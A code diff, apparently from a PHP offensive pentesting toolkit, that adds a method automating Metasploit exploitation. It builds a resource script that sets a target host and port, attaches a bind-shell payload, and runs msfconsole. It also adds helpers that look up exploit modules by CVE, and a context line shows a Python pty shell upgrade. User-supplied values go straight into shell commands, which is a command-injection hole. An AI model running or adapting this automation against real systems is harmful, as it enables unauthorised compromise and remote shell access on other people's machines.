@@ -1096,23 +1096,48 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         
     }
     
+    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
+        
+        $this->ssTitre(__FUNCTION__);
+        $file_exploit = trim($file_exploit);
+        $sha1_hash = sha1($file_exploit);
+        $filename_req = "$this->dir_tmp/$sha1_hash.exec.rc";
+        $filename_rst = "$this->dir_tmp/$sha1_hash.exec.rst";
+        if (!empty($file_exploit)){
+            if (!file_exists($filename_req)){
+                $query = "echo 'db_status\nuse $file_exploit\nset RHOSTS $target_ip\n set RPORT $target_port\nset payload generic/shell_bind_tcp\nset LHOST $attacker_ip\nset LPORT $attacker_port\nrun\n' > $filename_req";
+                $this->requette($query);
+            }
+                $query = "msfconsole -q  -r $filename_req " ;
+                return $query;
+        }
+   }
+    
+    public function msf2info($file_exploit){
+        $this->ssTitre(__FUNCTION__);
+        $hash = sha1($file_exploit);
+        $file_rst = "$this->dir_tmp/$hash.info.rst";
+        $query = "msfconsole -q -x 'info $file_exploit;exit' | tee $file_rst " ;
+        if (file_exists($file_rst)) return file_get_contents($file_rst);
+        else return $this->req_ret_str($query);
+    }
+    
+
+    
     public function msf2search2info($cve){
         $cve = trim($cve);
         $result = "";
         $files_exploit = array();
         $this->ssTitre(__FUNCTION__);
         $hash = sha1($cve);
-        $file_rst = "$this->dir_tmp/$hash.info.rst";
+        
         $files_exploit = array_filter($this->msf2search($cve)) ;
         if (!empty($files_exploit)){
             foreach ($files_exploit as $file_exploit){
                 if(!empty($file_exploit)){
                     $file_exploit = trim($file_exploit);
-            $this->article($cve, $file_exploit);
-            $query = "msfconsole -q -x 'info $file_exploit;exit' | tee $file_rst " ;
-            if (file_exists($file_rst)) return file_get_contents($file_rst);
-            else return $this->req_ret_str($query);
-           
+                    $this->article("INFO $file_exploit", $cve);
+            $result .= $this->msf2info($file_exploit);
             }
         }
         }
